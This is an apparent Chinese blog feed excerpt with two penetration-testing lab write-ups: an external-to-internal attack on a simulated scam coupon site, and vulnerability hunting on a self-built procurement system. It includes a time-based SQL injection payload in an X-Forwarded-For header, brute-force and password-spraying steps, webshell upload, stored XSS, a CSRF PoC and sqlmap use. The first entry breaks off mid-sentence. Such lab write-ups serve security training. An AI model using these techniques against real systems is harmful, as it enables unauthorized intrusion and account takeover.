        <content type="html"><![CDATA[<h1 id="外网打点到内网渗透-NASA项目"><a href="#外网打点到内网渗透-NASA项目" class="headerlink" title="外网打点到内网渗透 NASA项目"></a>外网打点到内网渗透 NASA项目</h1><span id="more"></span><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>模拟渗透测试电信诈骗网站，境外人员依赖该网站通过优惠卷诱导受害者进行消费，诈骗受害人金钱</p><p> linux windows 同存于内网，提供一个公网的web入口点,安全人员对网站/服务器进行综合的渗透测试，最终夺取各个服务器的权限。</p><p>靶场拓补</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220531100550047.png" alt="image-20220531100550047"></p><p>优惠卷网站搭建在ubantu上，在ubantu上访问本地80端口即可访问该网站。</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220531100717396.png" alt="image-20220531100717396"></p><p>购买vps外网服务器，使用frp将客户端ubantu上的本地80端口映射到vps服务器80端口，这样就简单的模拟了实战环境，靶机处于内网，提供了一个公网web入口点。</p><p>vps服务器windows，上传frp_windows_amd到服务器</p><p>服务端</p><p>frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common] bind_port = 7788 token=zzzzmoon199<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行</p><pre class="line-numbers language-none"><code class="language-none">frps.exe -c ./frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220601161413516.png" alt="image-20220601161413516"></p><p>ubuntu，上传frp_linux_amd到客户端</p><p>frpc.ini</p><pre class="line-numbers language-none"><code class="language-none">[common] server_addr = vps-ip server_port = 7788 token = zzzzmoon199 [web] type = tcp local_ip = 127.0.0.1 local_port = 80 remote_port = 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行，如果没有权限需要赋予权限</p><pre class="line-numbers language-none"><code class="language-none">./frpc -c ./frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里如果客户端执行返回连接拒绝，我们需要在防火墙配置规则</p></blockquote><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220601162851386.png" alt="image-20220601162851386"></p><p>之后我们访问公网的ip即可访问ubuntu的网站</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220601163450060.png" alt="image-20220601163450060"></p><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先对ip进行端口扫描，获取目标开放的端口，大致了解服务器开放的端口，在使用nmap对端口进行探测。</p><p>使用masscan扫描全部端口</p><pre class="line-numbers language-none"><code class="language-none">sudo masscan -p 1-65535 101.42.173.68 --rate=100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220601170517560.png" alt="image-20220601170517560"></p><p>使用nmap对开放端口进行探测</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV -A -p 80,7788,3389, -oN all-port.txt 101.42.173.68<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># Nmap 7.92 scan initiated Wed Jun  1 05:12:02 2022 as: nmap -sV -A -p 80,7788,3389, -oN all-port.txt 101.42.173.68Nmap scan report for 101.42.173.68Host is up (0.0056s latency).PORT     STATE SERVICE            VERSION80/tcp   open  http               Apache httpd 2.4.10 ((Debian))|_http-title: \xE4\xBC\x98\xE6\x83\xA0\xE5\x88\xB8\xE5\x95\x86\xE5\x9F\x8E|_http-server-header: Apache/2.4.10 (Debian)| http-robots.txt: 9 disallowed entries | /data /hook /public /module /template /admin /config.php |_/common.php /order/list3389/tcp open  ssl/ms-wbt-server?| ssl-cert: Subject: commonName=10_0_16_16| Not valid before: 2022-05-30T09:34:46|_Not valid after:  2022-11-29T09:34:46| rdp-ntlm-info: |   Target_Name: 10_0_16_16|   NetBIOS_Domain_Name: 10_0_16_16|   NetBIOS_Computer_Name: 10_0_16_16|   DNS_Domain_Name: 10_0_16_16|   DNS_Computer_Name: 10_0_16_16|   Product_Version: 6.3.9600|_  System_Time: 2022-06-01T09:13:13+00:00|_ssl-date: 2022-06-01T09:13:17+00:00; +3s from scanner time.7788/tcp open  ssl/unknown| ssl-cert: Subject: | Not valid before: 1-01-01T00:00:00|_Not valid after:  1-01-01T00:00:00|_ssl-date: TLS randomness does not represent timeHost script results:|_clock-skew: mean: 2s, deviation: 0s, median: 1sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun  1 05:13:14 2022 -- 1 IP address (1 host up) scanned in 72.02 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过以上扫描，我们对这个服务器开放的端口和端口开发的信息有了大致的了解。</p><p>似乎没有什么利用点。</p><p>我们查看网站的robots.txt文件，可看到定义了一些搜索引擎禁止收录的网页，我看都看看有没有什么可利用的，每个都看看，都点一点。</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220601172106144.png" alt="image-20220601172106144"></p><p>在/admin里发现了后台登录</p><pre class="line-numbers language-none"><code class="language-none">后台地址http://101.42.173.68/admin/webadmin.php?mod=do&amp;act=login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们顺手把前台的一些信息写下来</p><pre class="line-numbers language-none"><code class="language-none">前台登录http://101.42.173.68/user.php?mod=do&amp;act=login&amp;fromto=http%3A%2F%2F101.42.173.68%2F前台注册http://101.42.173.68/user.php?mod=do&amp;act=register&amp;fromto=http%3A%2F%2F101.42.173.68%2Fuser.php%3Fmod%3Ddo%26act%3Dlogin忘记密码http://101.42.173.68/user.php?mod=do&amp;act=getpw用户中心http://101.42.173.68/user.php顺手在注册界面注册一个账号，用户名treadstone 密码123456 手机11111111111 邮箱 abc@123.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在检查里面查看js文件，发现这是用逍遥商城建的站，这样的话我们就可以在网上找找这类网站的洞的文章</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609155613873.png" alt="image-20220609155613873"></p><p>这么多文章，足够我们参考了</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609155723091.png" alt="image-20220609155723091"></p><h3 id="后台安全测试"><a href="#后台安全测试" class="headerlink" title="后台安全测试"></a>后台安全测试</h3><p>之前我们了解此网站发现了后台地址，测试后台地址</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609160330082.png" alt="image-20220609160330082"></p><p>我们发现我们输入账号密码尝试登录后台时，提示账号或密码错误，但是我们发现验证码并没有刷新，一直是这个值</p><p>所以这里后台地址存在<strong>验证码重用漏洞</strong></p><h3 id="burpsuit穷举后台"><a href="#burpsuit穷举后台" class="headerlink" title="burpsuit穷举后台"></a>burpsuit穷举后台</h3><p>此网站后台存在验证码重用漏洞，所以我们可以利用burp对账号密码进行穷举</p><p>这里可以用这个网站，社工生成字典</p><pre class="line-numbers language-none"><code class="language-none">https://api.xiaobaibk.com/lab/guess/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我们知道此项目名为nasa，我们输入姓名nasa生成字典来爆破</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609161226142.png" alt="image-20220609161226142"></p><p>用户名我们就用admin，密码我们使用生成的字典，能看到我们找到了正确的账号密码</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609161936450.png" alt="image-20220609161936450"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们通过社工字典爆破出了密码，但是实际上这种方式如果用户使用高强度密码，我们基本不会成功。所以我们重点还是漏洞挖掘这方面，之前我们知道这是个逍遥商城，我们可以下载下来源码本地搭建，进行代码审计找出漏洞。</p><p>打开phpstudy，开启apache、mysql，创建网站</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609172343124.png" alt="image-20220609172343124"></p><p>将网站源码复制进根目录，全部替换，记得修改config.php的mysql密码</p><p>并且导入数据库</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609172630872.png" alt="image-20220609172630872"></p><p>可以看到搭建成功了</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609172732650.png" alt="image-20220609172732650"></p><p>可以使用phpstorm创建项目</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609173047621.png" alt="image-20220609173047621"></p><p>可一这样观看网站代码</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220609173300138.png" alt="image-20220609173300138"></p><h3 id="找回密码存在sql注入"><a href="#找回密码存在sql注入" class="headerlink" title="找回密码存在sql注入"></a>找回密码存在sql注入</h3><p>public\function\global.func.php</p><pre class="line-numbers language-none"><code class="language-none">//获取ipfunction pe_ip(){    if (isset($_SERVER)){        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {            $realip = $_SERVER["HTTP_CLIENT_IP"];        } else {            $realip = $_SERVER["REMOTE_ADDR"];        }    } else {        if (getenv("HTTP_X_FORWARDED_FOR")){            $realip = getenv("HTTP_X_FORWARDED_FOR");        } else if (getenv("HTTP_CLIENT_IP")) {            $realip = getenv("HTTP_CLIENT_IP");        } else {            $realip = getenv("REMOTE_ADDR");        }    }    $ip_arr = explode(',', $realip);    return $ip_arr[0];}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按住ctrl，鼠标单击pe_ip即可查看调用</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610150458827.png" alt="image-20220610150458827"></p><p>获取ip，多处调用，但是大多数都被程序里的gpc函数过滤掉了，找到一处没做处理的。</p><p>hook\yzmlog.hook.php </p><pre class="line-numbers language-none"><code class="language-none">function add_yzmlog($user, $yzm) {global $db;$sql_set['yzmlog_user'] = $user;$sql_set['yzmlog_value'] = $yzm;$sql_set['yzmlog_atime'] = time();$sql_set['yzmlog_adate'] = date('Y-m-d');$sql_set['yzmlog_ip'] = pe_ip();if ($db-&gt;pe_insert("yzmlog", $sql_set)) {return true;}else {return false;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$sql_set[‘yzmlog_ip’] = pe_ip();直接插入表没有做过滤。我们查看下那里调用了add_yzmlog这个函数。</p><p>hook\yzmlog.hook.php </p><pre class="line-numbers language-none"><code class="language-none">function send_yzm($type, $user, $apitype = 'juhe') {global $db, $cache_setting;pe_lead('hook/qunfa.hook.php');$user = pe_dbhold($user);$yzm = rand(100000,999999);//$linshi_pw = substr(md5($pe['host_root'].$email.rand(1,9999).time()), 5, 6);if ($type == 'email') {$email['qunfa_name'] = "尊敬的{$user}用户，请查收您的验证码";$email['qunfa_text'] = "尊敬的用户，您的邮箱验证码为：{$yzm}，验证码有效期为30分钟！请尽快验证，谢谢！";$result = qunfa_email($user, $email);}else {//一分钟内最多发送3次$nowtime = time() - 60;$yzmnum = $db-&gt;pe_num("yzmlog", " and `yzmlog_user` = '{$user}' and `yzmlog_atime` &gt;= '{$nowtime}'");if ($yzmnum &gt;= 3) {return array('result'=&gt;false, 'show'=&gt;'您发送的太频繁了，请稍后再试');}//一天内未验证次数超过5次的手机号就不让再发送了$yzmnum = $db-&gt;pe_num("yzmlog", " and `yzmlog_user` = '{$user}' and `yzmlog_state` = 0 and `yzmlog_adate` &gt;= '".date('Y-m-d')."'");if ($yzmnum &gt;= 5) {return array('result'=&gt;false, 'show'=&gt;'您今日发送太多了，请明日再试');}//一天内未验证次数超过10次的ip就不让再发送了$yzmnum = $db-&gt;pe_num("yzmlog", " and `yzmlog_ip` = '".pe_ip()."' and `yzmlog_state` = 0 and `yzmlog_adate` &gt;= '".date('Y-m-d')."'");if ($yzmnum &gt;= 10) {return array('result'=&gt;false, 'show'=&gt;'您今日发送太多了，请明日再试');}$result = qunfa_sms($user, "【{$cache_setting['sms_sign']}】尊敬的用户，您的验证码为：{$yzm}。如非本人操作，请忽略本短信");}if ($result['result']) add_yzmlog($user, $yzm);return $result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可看到在result不为空时，调用add_yzmlog这个函数</p><p><strong>触发漏洞流程：</strong>网站找回密码出-&gt;输入账号验证码-&gt;触发sql注入。</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610152515498.png" alt="image-20220610152515498"></p><p>我们在利用的时候，发现目标没有开启邮箱发信，所以利用失败了。我们在本地让result这个值为1，测试下sql注入是否存在</p><p>添加$result[‘result’]=1;</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610154440103.png" alt="image-20220610154440103"></p><p>注册个账号，开启burp代理，输入注册手机号/邮箱，点击获取验证码，burp抓到包</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610154520962.png" alt="image-20220610154520962"></p><p>构造payload，这里使用xff注入，sleep函数测试</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 111'AND (SELECT 1128 FROM (SELECT(select(sleep(4))))abc)-- aaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">GET /index.php?mod=check&amp;act=send_yzm&amp;type=getpw&amp;value=11111111111 HTTP/1.1Host: quan.jnwsf.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestX-Forwarded-For: 111'AND (SELECT 1128 FROM (SELECT(select(sleep(4))))abc)-- aaaaaConnection: closeReferer: http://quan.jnwsf.com/user.php?mod=do&amp;act=getpwCookie: PHPSESSID=lbs37cgrqinrkkmqt1jnsggcg1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们发送到repreter之后，点击send会发现出现明显延迟，所以这里sql注入是存在的，只是对方没有配置邮箱发信，无法利用。</p><h3 id="手机端sql注入"><a href="#手机端sql注入" class="headerlink" title="手机端sql注入"></a>手机端sql注入</h3><p>module\mobile_user\back.php</p><pre class="line-numbers language-none"><code class="language-none">$menumark = 'lxb';$cook_uid = $_SESSION['user_id'];switch ($act) {        case 'list':        default:                    $order_list = $db2-&gt;getAll('select * from xy_order where user_id='.$cook_uid.' and (  order_state = "whuishou" or  order_state = "endhuishou" ) order by id desc  ');         $goods = array();         $i=0;        foreach( $order_list as $k =&gt; &amp;$v )        {             $products = $db2-&gt;getAll( 'select * from xy_orderdata where order_id='.$v['order_id'] );                     foreach( $products as $pk =&gt; &amp;$vs )            {                               $goods[$i] = $db2-&gt;getOne( 'select product_name from xy_product where product_id= '.$vs['product_id'] );                 $i++;            }                        $v['product_name'] = implode(',', $goods );            $v['product_logo'] = $vs['product_logo'];        }                $menutitle = '我的回收';$seo = pe_seo($menutitle);include(pe_tpl('huishou_list.html'));    break;         case 'dohuishou':         $order_id = trim( $_REQUEST['order_id'] );         $order = $db2-&gt;getRow('select * from xy_order where order_id="'.$order_id.'"');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在act的case为dohuishou时，$order_id = trim( $_REQUEST[‘order_id’] );</p><p>没有做过滤，可能存在sql注入</p><p>触发漏洞流程：firefox添加User-Agent Switcher 插件，选择移动端，刷新页面</p><p><img src="/2022/05/30/day46/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610163111412.png" alt="image-20220610163111412"></p><p>注册并登录-&gt;点击我的-&gt;点击回收状态</p><pre class="line-numbers language-none"><code class="language-none">http://101.42.173.68/user.php?mod=back&amp;act=list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之前审计发现，需要让act=dohuishou，我们</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 外网打点 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘</title>
      <link href="/2022/05/19/day45/"/>
      <url>/2022/05/19/day45/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞挖掘与报告输出"><a href="#漏洞挖掘与报告输出" class="headerlink" title="漏洞挖掘与报告输出"></a>漏洞挖掘与报告输出</h1><span id="more"></span><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>搭建好的靶场10.68.5.62</p><p><img src="/2022/05/19/day45/image-20220523163852612.png" alt="image-20220523163852612"></p><p>俩个扫描器靶场：Nessus和awvs。</p><h2 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h2><p>因为是自己搭的靶场，所以用扫描器扫扫，看能否得到一些有用的信息。aevs、Nessus、goby啥的</p><p>现实中扫描器动静比较大</p><h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><p>启动Nessus工具靶机，root toor登录，查看IP</p><p><img src="/2022/05/19/day45/image-20220523165247065.png" alt="image-20220523165247065"></p><p>访问该ip的8834端口，Nessus  Nessus登录</p><p><img src="/2022/05/19/day45/image-20220523165506001.png" alt="image-20220523165506001"></p><p>点击scans-&gt;new scan，得到下图，箭头所指这俩个用的比较多，这里我们用web application tests</p><p><img src="/2022/05/19/day45/image-20220523165707063.png" alt="image-20220523165707063"></p><p>点击web application tests，开始设置扫描目标信息，我们在target处填写目标ip</p><p><img src="/2022/05/19/day45/image-20220523170326764.png" alt="image-20220523170326764"></p><p>点击save进入my scans中，点击暂停图标开始扫描，可看到状态为running</p><p><img src="/2022/05/19/day45/image-20220523170347378.png" alt="image-20220523170347378"></p><p>扫描完成后点击即可查看扫描信息</p><p><img src="/2022/05/19/day45/image-20220523170449848.png" alt="image-20220523170449848"></p><p>我们查看这些信息可以帮助我们了解该网站的结构，比如目录结构啥的。还有awvs不知道为啥起不来就不搞了。实际上我们搞的时候，用扫描器动静比较大，这里自己搭的靶场就无所谓了。</p><h2 id="登录穷举"><a href="#登录穷举" class="headerlink" title="登录穷举"></a>登录穷举</h2><p>访问目标IP，这是个采购系统登录界面</p><p><img src="/2022/05/19/day45/image-20220523170814124.png" alt="image-20220523170814124"></p><p>我们一直猜解弱口令，发现他只是提示用户名或密码错误    </p><p><img src="/2022/05/19/day45/image-20220523170915105.png" alt="image-20220523170915105"></p><p>显然没有做防护，我们可以使用burp爆破穷举出</p><p>用户名我们输入1，提示登录名不规范，这里试着输入a，同样的提示，很可能是长度做了限制</p><p><img src="/2022/05/19/day45/image-20220523171048073.png" alt="image-20220523171048073"></p><p>输入11，提示请输入密码，所以长度应该是从俩位数开始的，这为我们爆破缩小了范围。</p><p>我们这里用密码喷洒，这里尝试用户名从10-1000试试，如果没出来再扩大范围</p><p>使用burp爆破，使用intruder模块，选择sniper，payload设置如下</p><p><img src="/2022/05/19/day45/image-20220523171958639.png" alt="image-20220523171958639"></p><p>如果出现下图，先点击Hex，再点击Decimal，再开始攻击，这是burp的一个bug</p><p><img src="/2022/05/19/day45/image-20220523172544223.png" alt="image-20220523172544223"></p><p>可看到payload数量显示出来了</p><p><img src="/2022/05/19/day45/image-20220523172655158.png" alt="image-20220523172655158"></p><p>这里爆出来 999 123456 可成功登录</p><p><img src="/2022/05/19/day45/image-20220523172934847.png" alt="image-20220523172934847"></p><p>这里后来发现了一个问题，如果我们这里使用正确的账号名/登录名，错误的密码，他这里会提示如下，所以这里我们由此可以找出存在的用户名，上面跑出来运气有点好，既然如此，我们接下来思路也同样就密码喷洒就行，用同一个密码，看是否有账号匹配，这样跑。</p><p><img src="/2022/05/19/day45/image-20220525145445781.png" alt="image-20220525145445781"></p><h2 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h2><p><img src="/2022/05/19/day45/image-20220524145615133.png" alt="image-20220524145615133"></p><p>我们再用扫描器扫的时候，会发现一些目录，其中<a href="http://10.68.5.62/install/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%97%B6%E4%BC%9A%E9%80%A0%E6%88%90%E7%BD%91%E7%AB%99%E9%87%8D%E8%A3%85%EF%BC%8C%E5%8D%B1%E5%AE%B3%E8%BE%83%E5%A4%A7">http://10.68.5.62/install/，这个目录访问时会造成网站重装，危害较大</a></p><p><img src="/2022/05/19/day45/image-20220523173133196.png" alt="image-20220523173133196"></p><p>继续往下看还发现了默认账号遗留</p><p><img src="/2022/05/19/day45/image-20220523173214752.png" alt="image-20220523173214752"></p><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>我们以999这个账号登录进系统，点击采购申请发现提示没有申请权限，但是我们观察已经显示出来了采购申请这个界面</p><p><img src="/2022/05/19/day45/image-20220524135512973.png" alt="image-20220524135512973"></p><p>接下来我们思路是通过burp抓包之后，依次放包，再次点击确定的时候我们来到了采购申请里面</p><p><img src="/2022/05/19/day45/image-20220524135720677.png" alt="image-20220524135720677"></p><p>显然越权了</p><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>还是我们之前越权到的采购申请里，我们 发现有个文件上传点，试着上传恶意文件，看看能否找到上传路径</p><p>填写必填信息，选择恶意文件，点击上传</p><p><img src="/2022/05/19/day45/image-20220524145803729.png" alt="image-20220524145803729"></p><p>接下来burp放包，可看到上传界面，显示一些上传时的信息</p><p><img src="/2022/05/19/day45/image-20220524150032023.png" alt="image-20220524150032023"></p><p>再放包，可看到已经上传了，上传之后的文件被重命名了</p><p><img src="/2022/05/19/day45/image-20220524150130306.png" alt="image-20220524150130306"></p><p>这里继续往下利用，连接后门的时候，我们需要知道上传文件所在的路径才可以</p><p>这里我们访问upload试试，可看到是存在的，只是拒绝访问，所以我们上传上去的文件很可能被保存在此处</p><p><img src="/2022/05/19/day45/image-20220524150803300.png" alt="image-20220524150803300"></p><p>接下来的关键点就是找到上传文件所在的绝对路径，因为这里自己的靶场，所以我们是知道路径的，实际继续利用的时候我需要找到绝对路径。这里如果能判断出目标网站使用的是什么cms系统，我们可以下载此cms的网站源码，来拼接出上传路径。</p><pre class="line-numbers language-none"><code class="language-none">这里的路径就是http://10.68.5.62/upload/cg/application/20220524150425_1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拒绝访问我们还是连接成功了</p><p><img src="/2022/05/19/day45/image-20220524151100108.png" alt="image-20220524151100108"></p><p>之前搞文件上传到这里就结束了，再往下利用没有多思考过，想想怎么上线。。。</p><p>思路：上传反向连接后门，使用终端执行 start xxx.exe，但是这里终端执行命令返回ret=127，蚁剑有个插件来解决这个命令无法执行的问题，但是都是linux系统，有一个windows的试了试好像还是不行，暂时找不到解决办法</p><p><img src="/2022/05/19/day45/image-20220524164100007.png" alt="image-20220524164100007"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>找XSS洞的时候，我们就是顺手测</p><p>还是之前越权到的那个页面，我们测文件上传的时候，可以在事由这里用个一级标题，看看是不是以一级标题的格式显示给我们</p><p><img src="/2022/05/19/day45/image-20220524165404213.png" alt="image-20220524165404213"></p><p>我们填写好测试语句之后，点击添加明细，放包，到了这个页面，可以看到这个aaa明显格式变了</p><p><img src="/2022/05/19/day45/image-20220524165549497.png" alt="image-20220524165549497"></p><p>我们继续填写好信息，点击添加，填写信息的时候可以都顺手测测</p><p><img src="/2022/05/19/day45/image-20220524165704398.png" alt="image-20220524165704398"></p><p>之后我们关闭代理，点击申请查询，查看之前提交的，明显这是个存储型xss</p><p><img src="/2022/05/19/day45/image-20220524170000110.png" alt="image-20220524170000110"></p><p>这里尝试弹窗也成功弹了，去申请查询那里也弹了。</p><p><img src="/2022/05/19/day45/image-20220524170106686.png" alt="image-20220524170106686"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>我的桌面-&gt;个人信息，点击提交修改，burp抓包</p><p><img src="/2022/05/19/day45/image-20220525142655918.png" alt="image-20220525142655918"></p><p>我们可以修改下信息，比如这里将登录名我改为888，生成CSRF POC</p><p><img src="/2022/05/19/day45/image-20220525142859669.png" alt="image-20220525142859669"></p><p>将生成的HTML代码保存下来</p><p><img src="/2022/05/19/day45/image-20220525143648055.png" alt="image-20220525143648055"></p><p>我们可以新建一个csrf.html的文件，将html代码放进去。这里我们将这个html文件放在本地的phpstudy网站下</p><p>访问该网页，点击submit</p><p><img src="/2022/05/19/day45/image-20220525144237526.png" alt="image-20220525144237526"></p><p>可看到显示修改成功，登录名改为888了</p><p><img src="/2022/05/19/day45/image-20220525144313401.png" alt="image-20220525144313401"></p><p>这里用888 123456也可以登录该系统，他这里的用户名有人员编号、登录名、邮箱和电话等。</p><p><img src="/2022/05/19/day45/image-20220525144428766.png" alt="image-20220525144428766"></p><p>这里试了下，这几个都可以登录，密码都是123456</p><p>这里同样也可以加上修改密码，访问该网站之后，密码改变。</p><h2 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h2><p>之前我们前台的漏洞我们基本挖的差不多了，之前我们在扫描该网站的时候，会发现该网站的后台</p><p><img src="/2022/05/19/day45/image-20220525165211579.png" alt="image-20220525165211579"></p><p>可以看到，我们在进入后台的时候，他的管理员账号密码直接显示出来了，可以直接登录进入后台。</p><h2 id="穷举"><a href="#穷举" class="headerlink" title="穷举"></a>穷举</h2><p>他这里的登录跟前台一样， 所以也存在一个穷举漏洞，具体思路跟之前一样</p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>这里我们可以看下前台的用户能否登录进入后台</p><p>我们在用默认的账号密码登录进入后台后，拿到他的url</p><pre class="line-numbers language-none"><code class="language-none">http://10.68.5.62/navigation/cg/admin/main.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在登陆进前台</p><p><img src="/2022/05/19/day45/image-20220525165727716.png" alt="image-20220525165727716"></p><p>我们将后面的目录更换掉，看看能不能使用前台用户登录进后台</p><p><img src="/2022/05/19/day45/image-20220525165808664.png" alt="image-20220525165808664"></p><p>这里看到我们更换掉后面的目录后，登录了后台</p><p>则合理弹窗显示 :”您没有管理权限”，但是我们点了确定之后，还是可以在后台进行一些操作，比如下图，查看一些用户信息啥的</p><p><img src="/2022/05/19/day45/image-20220525165949464.png" alt="image-20220525165949464"></p><p>我们来使用999前台账户来越权篡改，选中123账户，点击重置密码</p><p><img src="/2022/05/19/day45/image-20220526161552311.png" alt="image-20220526161552311"></p><p>可看到下图显示修改密码成功，登录123账户，发现秘密被修改了。显然存在一个越权篡改。</p><p><img src="/2022/05/19/day45/image-20220526161625020.png" alt="image-20220526161625020"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>我们登录进入后台，直接登进入或者垂直越权登进去都行，点击人员查询，在右侧的查询那里输入’，显示查询异常，很可能存在sql注入</p><p><img src="/2022/05/19/day45/image-20220525171251533.png" alt="image-20220525171251533"></p><p>我们把包抓下来，发送到sqlmap</p><p><img src="/2022/05/19/day45/image-20220525171420728.png" alt="image-20220525171420728"></p><p>我们把level设置为3，勾上当前数据库，用户名，密码，看能否出来</p><p><img src="/2022/05/19/day45/image-20220525171137474.png" alt="image-20220525171137474"></p><p>可以看到数据库名为mscn2，账号为sa，密码好像没跑出来，暂时先这样</p><p><img src="/2022/05/19/day45/image-20220525171156276.png" 